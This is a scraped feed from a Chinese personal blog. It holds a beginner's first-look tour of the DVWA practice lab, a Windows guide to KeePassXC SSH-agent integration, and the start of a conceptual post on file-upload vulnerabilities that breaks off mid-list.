srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317_hu59920bdd9bcb7bdd2dfa79f904f3464d_19156_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421151523317_hu59920bdd9bcb7bdd2dfa79f904f3464d_19156_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421151523317"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="232px"
>&lt;/p>
&lt;p>默认账号密码是 &lt;code>admin&lt;/code> 和 &lt;code>password&lt;/code> 。&lt;/p>
&lt;h2 id="信息收集">信息收集&lt;/h2>
&lt;h3 id="介绍">介绍&lt;/h3>
&lt;p>在侧边栏可以看到可用的模块。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120.png"
width="203"
height="616"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120_hu9894033129233fb1163094cac0397a05_15927_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421152621120_hu9894033129233fb1163094cac0397a05_15927_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421152621120"
class="gallery-image"
data-flex-grow="32"
data-flex-basis="79px"
>&lt;/p>
&lt;p>具体内容稍后再看，先把主页上的信息读一读。&lt;/p>
&lt;p>介绍中这样说：&lt;/p>
&lt;blockquote>
&lt;p>It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.&lt;/p>
&lt;/blockquote>
&lt;p>用户自己决定怎么玩这个靶场，没有固定目标。可以先把一个模块从低难度到高难度全打通再继续下一个，也可以低难度把所有模块打通再提高难度再来一轮。&lt;/p>
&lt;blockquote>
&lt;p>Please note, there are &lt;em>both documented and undocumented vulnerability&lt;/em> with this software. This is intentional. You are encouraged to try and discover as many issues as possible.&lt;/p>
&lt;/blockquote>
&lt;p>并且还提到有意存在未文档化的漏洞，也就是攻破一个模块的方法并不局限于帮助文档里的方法，完全可能自己挖掘出别的问题。&lt;/p>
&lt;blockquote>
&lt;p>DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty.&lt;/p>
&lt;/blockquote>
&lt;p>DVWA 还包含了 WAF，可以自己开启或者关闭。开启等于是给自己提高了难度。&lt;/p>
&lt;h3 id="php-info">PHP info&lt;/h3>
&lt;p>侧边栏下方有个 PHP Info 链接，点开看一眼，就是个经典的 phpinfo 页。&lt;/p>
&lt;p>php 版本是 7.0.30-0+deb9u1，应该是 debian 打包的版本。&lt;/p>
&lt;p>Apache 版本 2.4.25，Debian 打包的版本。&lt;/p>
&lt;p>其他半懂不懂的全部略，就当没看见。&lt;/p>
&lt;p>之后有需要再来看。&lt;/p>
&lt;h3 id="关于">关于&lt;/h3>
&lt;p>在 About 页里提到发行时间是 2015-10-08，确实很老了。&lt;/p>
&lt;p>里面还有些相关链接和资源、文档，把 dvwa 的官网主页加入收藏夹后剩下的内容暂且不管。&lt;/p>
&lt;h3 id="dvwa-security">DVWA security&lt;/h3>
&lt;p>安全配置页，显示当前的 DVWA 运行在哪个安全级别（就是前文介绍中提到的 &lt;strong>难度&lt;/strong>）。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935.png"
width="904"
height="879"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935_hu1e8ee6e0e7ee30ed3f4d3caa6e5f5d59_111848_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421154901935_hu1e8ee6e0e7ee30ed3f4d3caa6e5f5d59_111848_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421154901935"
class="gallery-image"
data-flex-grow="102"
data-flex-basis="246px"
>&lt;/p>
&lt;p>注意到页面这几个位置都有标注当前安全配置，在这个页面可以修改安全级别和 WAF （图中 PHPIDS）的开启状态。&lt;/p>
&lt;h3 id="setupreset-db">Setup/Reset DB&lt;/h3>
&lt;p>这个页面就是最初启动 DVWA 的时候初始化数据库的页面，可以在这个页面里重置数据库，也能在这个页面看到一些自检信息。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454.png"
width="896"
height="918"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454_hu8695d1d6b0b3980f08b0158e40b7c78e_108856_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155109454_hu8695d1d6b0b3980f08b0158e40b7c78e_108856_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421155109454"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="234px"
>&lt;/p>
&lt;p>&lt;code>allow_url_include&lt;/code>暂时不管，等玩到那个模块的时候再看情况。&lt;/p>
&lt;p>&lt;code>reCAPTCHA key&lt;/code> 是验证码模块需要的，等玩到的时候再找下怎么配。&lt;/p>
&lt;p>最下面的 &lt;code>Create / Reset Database&lt;/code> 的按钮就是重置数据库了。对于用 &lt;code>docker --rm&lt;/code> 启动的我来说直接重启下容器清理地更干净，预计不会怎么用到这个功能。&lt;/p>
&lt;h3 id="模块速览">模块速览&lt;/h3>
&lt;h4 id="brute-force">Brute Force&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710.png"
width="909"
height="340"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710_hue7b4ec4cb7abd897183a8792139fe6c5_35249_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421155923710_hue7b4ec4cb7abd897183a8792139fe6c5_35249_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421155923710"
class="gallery-image"
data-flex-grow="267"
data-flex-basis="641px"
>&lt;/p>
&lt;p>一般说 Brute Force 的时候就是暴力破解了，”跑字典“啊什么的。遍历可能存在的的弱密码。&lt;/p>
&lt;h4 id="command-injection">Command Injection&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139.png"
width="896"
height="266"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139_hu25562b7f964fec8daa9cf0338b8b0c6e_31856_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160341139_hu25562b7f964fec8daa9cf0338b8b0c6e_31856_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160341139"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="808px"
>&lt;/p>
&lt;p>命令注入，相当经典的一个 ping，应该看一眼就知道指的什么了。&lt;/p>
&lt;h4 id="csrf">CSRF&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952.png"
width="905"
height="363"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952_hu5f2fbd6d82dca55f3f85cc4115c97c39_41581_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160436952_hu5f2fbd6d82dca55f3f85cc4115c97c39_41581_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160436952"
class="gallery-image"
data-flex-grow="249"
data-flex-basis="598px"
>&lt;/p>
&lt;p>跨站请求伪造，有点摸不着头脑。emm，难道是说这个页面没有考虑 csrf （可能还有cors？），所以能在别的站直接发个 xhr 实现修改密码？&lt;/p>
&lt;h4 id="file-inclusion">File Inclusion&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753.png"
width="912"
height="321"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753_hua44789798500bf09a6d2ea7ea0a9e538_27839_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160749753_hua44789798500bf09a6d2ea7ea0a9e538_27839_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160749753"
class="gallery-image"
data-flex-grow="284"
data-flex-basis="681px"
>&lt;/p>
&lt;p>没思路。虽然看过 p 大博客信手拈来的文件包含利用，但对着这个页面暂时还是想不出要干啥。&lt;/p>
&lt;blockquote>
&lt;p>PS：刚发现地址栏有点意思&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316.png"
width="337"
height="33"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316_hua5ff4026705173dea9ff93cd0ab7564d_2751_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421160947316_hua5ff4026705173dea9ff93cd0ab7564d_2751_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421160947316"
class="gallery-image"
data-flex-grow="1021"
data-flex-basis="2450px"
>&lt;/p>
&lt;/blockquote>
&lt;h4 id="file-upload">File Upload&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745.png"
width="895"
height="294"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745_hu764096419eb208ee58c131f60e4b10b0_30395_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161006745_hu764096419eb208ee58c131f60e4b10b0_30395_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161006745"
class="gallery-image"
data-flex-grow="304"
data-flex-basis="730px"
>&lt;/p>
&lt;p>可能是任意文件上传相关的洞？&lt;/p>
&lt;h4 id="insecure-captcha">Insecure CAPTCHA&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749.png"
width="911"
height="306"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749_hu0f16c8e6b310cccc5ccf0aaf8819ad20_36210_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161050749_hu0f16c8e6b310cccc5ccf0aaf8819ad20_36210_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161050749"
class="gallery-image"
data-flex-grow="297"
data-flex-basis="714px"
>&lt;/p>
&lt;p>看标题还是有点意思的，不安全的验证码指的是可以绕过验证码么？&lt;/p>
&lt;h4 id="sql-injection">SQL Injection&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372.png"
width="909"
height="341"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372_hu5bf7f52e9c2b4302389ebec44db8f820_37409_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161127372_hu5bf7f52e9c2b4302389ebec44db8f820_37409_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161127372"
class="gallery-image"
data-flex-grow="266"
data-flex-basis="639px"
>&lt;/p>
&lt;p>经典SQL注入。&lt;/p>
&lt;h4 id="sql-injection-blind">SQL Injection (Blind)&lt;/h4>
&lt;p>和上面一样，不过是盲注。&lt;/p>
&lt;h4 id="weak-session-ids">Weak Session IDs&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944.png"
width="912"
height="361"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944_hu0fdf17129a2a99d77936b492c1d40748_32668_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161207944_hu0fdf17129a2a99d77936b492c1d40748_32668_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161207944"
class="gallery-image"
data-flex-grow="252"
data-flex-basis="606px"
>&lt;/p>
&lt;p>对 PHP 还不够了解，不知道 &lt;code>Weak Session IDs&lt;/code> 指的是什么。可能和 Cookie 里的 &lt;code>PHPSESSID&lt;/code> 有关系？&lt;/p>
&lt;h4 id="xss-dom">XSS (DOM)&lt;/h4>
&lt;p>见下。&lt;/p>
&lt;h4 id="xssreflected">XSS(Reflected)&lt;/h4>
&lt;p>见下。&lt;/p>
&lt;h4 id="xssstored">XSS(Stored)&lt;/h4>
&lt;p>三类 XSS ，页面分别如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348.png"
width="680"
height="276"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348_hu1b4996709ef6808dda534c7704190b50_28036_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161441348_hu1b4996709ef6808dda534c7704190b50_28036_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(DOM)"
class="gallery-image"
data-flex-grow="246"
data-flex-basis="591px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360.png"
width="685"
height="267"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360_hu0bb9744a0e435d0dcc709c36a8622d4a_28074_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161450360_hu0bb9744a0e435d0dcc709c36a8622d4a_28074_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(reflected)"
class="gallery-image"
data-flex-grow="256"
data-flex-basis="615px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946.png"
width="679"
height="393"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946_hubc91e88711d10c78d8195fedb9cf37e2_33015_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161457946_hubc91e88711d10c78d8195fedb9cf37e2_33015_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="XSS(Stored)"
class="gallery-image"
data-flex-grow="172"
data-flex-basis="414px"
>&lt;/p>
&lt;p>除了 DOM 型看页面没有思路，另外两个看注入点还是清楚的。&lt;/p>
&lt;h4 id="csp-bypass">CSP Bypass&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897.png"
width="701"
height="290"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897_hu941ee16f0a67ff004f04e4e50818b863_27413_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161626897_hu941ee16f0a67ff004f04e4e50818b863_27413_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161626897"
class="gallery-image"
data-flex-grow="241"
data-flex-basis="580px"
>&lt;/p>
&lt;p>不了解 CSP，没头绪。&lt;/p>
&lt;h4 id="javascript">JavaScript&lt;/h4>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960.png"
width="679"
height="280"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960_huc87a5a196e2cb78c1789a7565c0274b5_25147_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-01/image-20220421161759960_huc87a5a196e2cb78c1789a7565c0274b5_25147_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421161759960"
class="gallery-image"
data-flex-grow="242"
data-flex-basis="582px"
>&lt;/p>
&lt;p>有点摸不着头脑，指的是在前端用 JS 检查表单不安全？&lt;/p>
&lt;p>看链接里的 &lt;code>es6-proxies-in-depth&lt;/code> 感觉是个绕过前端保护的题。&lt;/p>
&lt;h2 id="初体验总结">初体验总结&lt;/h2>
&lt;p>姑且算是把 DVWA 这个靶场在手里把玩了一下，初步看了看怎么玩、有什么可玩。&lt;/p>
&lt;p>接下来考虑是一题一题难度从低到高慢慢刷过去，实在干不过再跳。&lt;/p></description></item><item><title>尝鲜keepassxc的ssh集成</title><link>https://nnnewb.github.io/blog/p/keepassxc-ssh-integration/</link><pubDate>Thu, 21 Apr 2022 10:27:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/keepassxc-ssh-integration/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>突发奇想，先前一直把密码存在 keepassxc 里，但 SSH 秘钥是存在 keepassxc 的备注里，用的时候还得先复制出来建个文件，虽然只用折腾一次但还是嫌麻烦。&lt;/p>
&lt;p>于是想到 keepassxc 自带 SSH 集成，于是研究了下怎么用 SSH 集成在 keepassxc 里保存秘钥对，省掉复制出秘钥内容到文件里的过程，还更安全。&lt;/p>
&lt;h2 id="过程">过程&lt;/h2>
&lt;h3 id="平台和选型">平台和选型&lt;/h3>
&lt;p>首先确定 keepassxc 和 ssh 运行的平台，keepassxc 本体是支持 Windows/MacOS/Linux 三端的，ssh 在Windows上倒是有几种不同的选型。&lt;/p>
&lt;p>在 Windows 10 Build 1809 版本之后，Windows 已经内置了 OpenSSH 软件，还在用 PuTTY 的可以省掉 PuTTY 了。&lt;/p>
&lt;p>旧点的 Windows 可以选择 PuTTY 或者装一个基于 MinGW 的 OpenSSH，如 Git-SCM 自带的 OpenSSH 或者 MSYS2、MinGW64 一类。&lt;/p>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>keepassxc 的 ssh 集成本质是主动往 ssh-agent 添加秘钥，ssh 命令从 ssh-agent 读到秘钥，尝试用秘钥连接服务器。表现出的效果就是和直接把秘钥放在 &lt;code>.ssh/id_rsa&lt;/code> 也没什么区别。&lt;/p>
&lt;p>keepassxc 还支持解锁自动添加和锁定时自动删除，还有超时自动删除，安全性会稍再好一点，可惜 Windows 自带的 OpenSSH 不支持使用秘钥时给用户确认（见 issue &lt;a class="link" href="https://github.com/PowerShell/Win32-OpenSSH/issues/1056" target="_blank" rel="noopener"
>#1056&lt;/a>），导致开启 keepassxc 的确认功能时会添加秘钥失败。&lt;/p>
&lt;p>至于 ssh-agent 的原理就略过不提了，可以理解成一个秘钥代理，ssh 自动问 ssh-agent 有什么秘钥可用，就像保管钥匙的管家。&lt;/p>
&lt;h3 id="配置-openssh">配置 OpenSSH&lt;/h3>
&lt;p>参考 keepassxc 的文档，先启动 Windows 自带的 OpenSSH 的 ssh-agent 服务。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">Get-Service&lt;/span> &lt;span class="nb">ssh-agent&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Set-Service&lt;/span> &lt;span class="n">-StartupType&lt;/span> &lt;span class="n">Automatic&lt;/span>
&lt;span class="nb">PS &lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">Start-Service&lt;/span> &lt;span class="nb">ssh-agent&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意上面的命令需要 &lt;strong>管理员权限&lt;/strong> 运行。&lt;/p>
&lt;p>就是这样！&lt;/p>
&lt;h3 id="配置-keepassxc">配置 keepassxc&lt;/h3>
&lt;p>之后在 keepassxc 里打开 ssh 集成，选中 OpenSSH 作为代理。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-application-settings.png"
width="1601"
height="1218"
srcset="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-application-settings_huf85379ed477f6ac0dbb86a595d8f10b4_56971_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-application-settings_huf85379ed477f6ac0dbb86a595d8f10b4_56971_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="sshagent application settings"
class="gallery-image"
data-flex-grow="131"
data-flex-basis="315px"
>&lt;/p>
&lt;p>然后添加一个常规的密码记录，在高级里添加秘钥文件，并在 SSH 里启用：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-entry-settings.png"
width="1758"
height="1374"
srcset="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-entry-settings_huc6b8a73468d62e299570a0a7d6f50725_56080_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-entry-settings_huc6b8a73468d62e299570a0a7d6f50725_56080_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="sshagent entry settings"
class="gallery-image"
data-flex-grow="127"
data-flex-basis="307px"
>&lt;/p>
&lt;p>注意勾选 &lt;code>Add key to agent when database is opened/unlocked&lt;/code> 和 &lt;code>Remove key from agent when database is closed/locked&lt;/code>，这两个选项会让 keepassxc 解锁的情况下自动在后台添加 SSH 秘钥到 ssh-agent，同时当你关闭 keepassxc 之后 SSH 就无法再从 ssh-agent 拿到秘钥，体验会更自然。&lt;/p>
&lt;p>如果不勾选这两个选项，也可以手动在设置了 SSH 代理的项目上右击添加到 ssh-agent。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-context-menu.png"
width="1758"
height="1265"
srcset="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-context-menu_hu5f860989dfb1f00a09b694a656667942_49439_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/sshagent-context-menu_hu5f860989dfb1f00a09b694a656667942_49439_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="sshagent context menu"
class="gallery-image"
data-flex-grow="138"
data-flex-basis="333px"
>&lt;/p>
&lt;p>这种方式添加到 ssh-agent 的秘钥不会自动从 ssh-agent 删除或自动添加，每次重启都要自己右键添加，比较麻烦。&lt;/p>
&lt;h3 id="检查">检查&lt;/h3>
&lt;p>如何确认配置正确无误？&lt;/p>
&lt;p>可以通过几个方面：&lt;/p>
&lt;ol>
&lt;li>在设置-SSH代理界面，顶部有个绿条，提示 ”SSH代理连接工作正常！“&lt;/li>
&lt;li>在命令行运行&lt;code>ssh-add -l&lt;/code>，会列出你刚添加的秘钥。&lt;/li>
&lt;li>尝试&lt;code>ssh&lt;/code>连接你的服务器，公钥登陆成功。&lt;/li>
&lt;/ol>
&lt;p>如果 “SSH 代理连接工作正常” 没出现的话可能是 ssh-agent 服务没启动或者有问题，可以 &lt;code>stop-service ssh-agent&lt;/code> 停止 &lt;code>ssh-agent&lt;/code> 这个系统服务后再在命令行运行 &lt;code>ssh-agent -d&lt;/code>，输出调试日志，看看具体什么问题。&lt;/p>
&lt;p>如果&lt;code>ssh-add -l&lt;/code>没有输出，也是一样，检查&lt;code>ssh-agent&lt;/code>是否在运行，如果在运行但依然没有，用&lt;code>-d&lt;/code>参数启动 ssh-agent 看看添加秘钥的步骤有什么问题。&lt;/p>
&lt;p>如果 &lt;code>ssh-add -l&lt;/code> 有输出了，但 ssh 连接依然问你要密码，有两种可能：&lt;/p>
&lt;ol>
&lt;li>你的 ssh 秘钥有密码保护，一般是 &lt;code>ssh-keygen&lt;/code> 的时候设置的。&lt;/li>
&lt;li>秘钥被拒绝了。&lt;/li>
&lt;/ol>
&lt;p>有密码保护的秘钥 ssh 命令有提示，注意看 ssh 命令的输出就行。秘钥被拒绝的情况表面很难看出来，可以用 &lt;code>-vvv&lt;/code> 参数再运行 ssh 命令，看命令输出。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101423653.png"
width="1044"
height="157"
srcset="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101423653_hu955d457efbed342c16ebd2cc7efa854b_176372_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101423653_hu955d457efbed342c16ebd2cc7efa854b_176372_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421101423653"
class="gallery-image"
data-flex-grow="664"
data-flex-basis="1595px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101509008.png"
width="1029"
height="99"
srcset="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101509008_hufdb8d068113679e23d2947d5c9dd2a58_103423_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101509008_hufdb8d068113679e23d2947d5c9dd2a58_103423_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421101509008"
class="gallery-image"
data-flex-grow="1039"
data-flex-basis="2494px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101612311.png"
width="900"
height="99"
srcset="https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101612311_hu416fe79149793836d529a9d87da9135b_46057_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/keepassxc-ssh-integration/image-20220421101612311_hu416fe79149793836d529a9d87da9135b_46057_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220421101612311"
class="gallery-image"
data-flex-grow="909"
data-flex-basis="2181px"
>&lt;/p>
&lt;p>如果 &lt;code>will attempt key&lt;/code> 没有出现 &lt;code>ssh-add -l&lt;/code> 列出的秘钥，还可能是因为 &lt;code>.ssh/config&lt;/code> 里，给你要连接的 Host 设置了 &lt;code>IdentitiesOnly yes&lt;/code>。这个设置项会强制 ssh 只使用本地的 &lt;code>.ssh/id_rsa&lt;/code> 等私钥文件。&lt;/p>
&lt;p>另外 &lt;code>.ssh/config&lt;/code> 里可能还指定了别的验证方式也会导致不使用公钥，这就要靠自己检查 &lt;code>.ssh/config&lt;/code> 来排错了。&lt;/p>
&lt;h3 id="配置-git">配置 Git&lt;/h3>
&lt;p>Windows 下还有个坑，在提交博客的时候才发现。 Git-SCM 默认使用的 SSH 命令不是 Windows 自带的 OpenSSH。这会导致 Git 在推送的时候不使用我们添加到 ssh-agent （Windows 自带的 OpenSSH 版 ssh-agent）的秘钥，而是用 Git-SCM 自带的 MinGW 版 OpenSSH，造成推送时提示 &lt;code>Permission Denied (publickey)&lt;/code> 。&lt;/p>
&lt;p>解决办法也很简单，&lt;code>git config --global core.SshCommand &amp;quot;C:/Windows/System32/OpenSSH/ssh.exe&amp;quot;&lt;/code> 把 Windows 自带的 OpenSSH 设置成 Git 默认使用的 ssh 即可。需要注意 &lt;strong>这里的路径用正斜杠&lt;code>/&lt;/code>分隔，不要用反斜杠&lt;code>\&lt;/code>&lt;/strong> 。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>总的来说用 ssh-agent 配合 keepassxc 玩 ssh 还是很舒服的，特别是迁移起来的时候，只要同步和备份 keepassxc 的数据库就完事。&lt;/p>
&lt;p>keepassxc 的附加文件也非常适合把 GPG 之类的秘钥备份起来，换工作机或者自己电脑重装迁移的时候都能省不少心思。&lt;/p></description></item><item><title>安全入门系列-上传漏洞和远程命令执行</title><link>https://nnnewb.github.io/blog/p/get-start-cyber-security-upload-and-remote-command-execution-vulnerability/</link><pubDate>Wed, 20 Apr 2022 15:59:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-cyber-security-upload-and-remote-command-execution-vulnerability/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>迫不及待要找个靶场实践了，抓紧把剩下的两种概念捋一捋。&lt;/p>
&lt;h2 id="任意文件上传">任意文件上传&lt;/h2>
&lt;p>上传漏洞本质是&lt;/p>
&lt;ol>
&lt;li>可以上传任意类型文件&lt;/li>
&lt;li>&lt;strong>可以远程执行或利用被上传的文件发起进一步攻击&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>缺一不可。&lt;/p>
&lt;p>能上传不能利用的情况：&lt;/p>
&lt;p>举例来说，业务代码里没检查上传文件的 &lt;code>mimetype&lt;/code>，你传了一个包含恶意代码的文件&lt;code>I_am_hacker_hahaha.php&lt;/code>上传到了服务器上，但服务端是一个独立 Go 程序，没有 &lt;code>httpd&lt;/code>也没有&lt;code>nginx&lt;/code>，那任你传什么恶意脚本都没用——根本不会去执行你的代码。&lt;/p>
&lt;p>能利用但没法上传的情况：&lt;/p>
&lt;p>比如过滤很完善，会检查文件头的 Magic 之类的。还有一种是服务端用了对象存储服务。阿里云 OSS ，腾讯云 OSS，七牛云。虽然服务器配的是 &lt;code>httpd&lt;/code>+&lt;code>php&lt;/code> 的经典组合，文件名解析漏洞也没补，但上传的文件根本没放服务器上也不行（emm，没依据，不过要是能执行别的服务器上的代码的话就是远程代码执行的大洞了吧）。&lt;/p>
&lt;p>所以要利用的话，应该要求是：&lt;/p>
&lt;ol>
